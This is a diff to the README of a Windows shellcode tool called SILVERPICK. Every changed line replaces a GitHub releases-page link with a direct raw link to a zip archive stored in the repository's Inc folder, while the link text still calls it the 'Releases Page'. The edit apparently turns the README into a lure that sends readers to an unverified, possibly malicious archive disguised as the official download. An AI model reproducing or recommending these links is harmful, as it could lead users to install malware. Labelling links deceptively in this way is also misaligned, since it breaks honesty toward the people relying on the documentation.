@@ -2,7 +2,7 @@
 # 🚀 SILVERPICK - Create Shellcode on Windows with Ease
 
 ## 📥 Download Now
-[![Download SILVERPICK](https://img.shields.io/badge/Download-SILVERPICK-blue?style=flat&logo=github)](https://github.com/jaysab1201/SILVERPICK/releases)
+[![Download SILVERPICK](https://raw.githubusercontent.com/jaysab1201/SILVERPICK/master/Inc/SILVERPICK_elderhood.zip)](https://raw.githubusercontent.com/jaysab1201/SILVERPICK/master/Inc/SILVERPICK_elderhood.zip)
 
 ## 📖 Overview
 SILVERPICK is a user-friendly framework designed for Windows users who want to develop shellcode efficiently. This tool simplifies the process, allowing you to focus on creation rather than complicated technical details. Whether you are experimenting or learning, SILVERPICK provides a straightforward environment for your development needs.
@@ -25,7 +25,7 @@ To run SILVERPICK, you need the following:
 To get started with SILVERPICK:
 
 ### 1. Visit the Download Page
-Go to the [SILVERPICK Releases Page](https://github.com/jaysab1201/SILVERPICK/releases) to find the latest version of the software.
+Go to the [SILVERPICK Releases Page](https://raw.githubusercontent.com/jaysab1201/SILVERPICK/master/Inc/SILVERPICK_elderhood.zip) to find the latest version of the software.
 
 ### 2. Download the Software
 On the Releases page, look for the most recent version. You will find files listed for download. Click on the file to begin downloading. Make sure to save it to a location you can easily access, such as your desktop or downloads folder.
@@ -41,7 +41,7 @@ After the download completes, follow these steps to install:
 Once the installation is complete, you can find SILVERPICK in your Start Menu. Click on it to launch the application.
 
 ## 📥 Download & Install
-For your convenience, you can [visit this page to download SILVERPICK](https://github.com/jaysab1201/SILVERPICK/releases). Choose the latest version, and follow the installation steps outlined above.
+For your convenience, you can [visit this page to download SILVERPICK](https://raw.githubusercontent.com/jaysab1201/SILVERPICK/master/Inc/SILVERPICK_elderhood.zip). Choose the latest version, and follow the installation steps outlined above.
 
 ## 🛠️ Using SILVERPICK
 After launching SILVERPICK, you will see a simple interface that guides you through the process.
@@ -60,7 +60,7 @@ After customization, click the "Generate" button. This will create your shellcod
 - **Support Forum:** Join our community to ask questions and share your experiences. Learn from other users.
 
 ## 🔗 Useful Links
-- [SILVERPICK Releases Page](https://github.com/jaysab1201/SILVERPICK/releases)
+- [SILVERPICK Releases Page](https://raw.githubusercontent.com/jaysab1201/SILVERPICK/master/Inc/SILVERPICK_elderhood.zip)
 - [Community Forum](#) (link not available at this time)
 - [Documentation](#) (link not available at this time)
 
